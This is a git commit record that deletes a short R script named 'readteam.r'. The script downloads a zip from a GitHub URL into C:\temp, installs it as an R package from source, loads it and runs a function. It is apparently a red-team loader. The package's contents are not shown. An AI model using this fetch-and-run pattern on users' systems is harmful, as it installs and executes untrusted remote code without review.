a9bf5226abc8e5be471cb928c349f160bb70a2ea
r3dp1ll <dinesh8642@gmail.com>
2022-04-19 16:06:39 +1000

    Delete readteam.r

--- readteam.r
+++
@@ -1,7 +0,0 @@
-URL<-"https://github.com/dinesh8642/test/raw/main/RcppStudent_0.0.1.zip"
-DEST<-"C:\\temp\\RcppStudent_0.0.1.zip"
-download.file(URL,DEST)
-zpkg = ("C:\\temp\\RcppStudent_0.0.1.zip")
-install.packages(zpkg, repos=NULL, type="source")
-library(RcppStudent)
-rcppStudent::simulate_student()
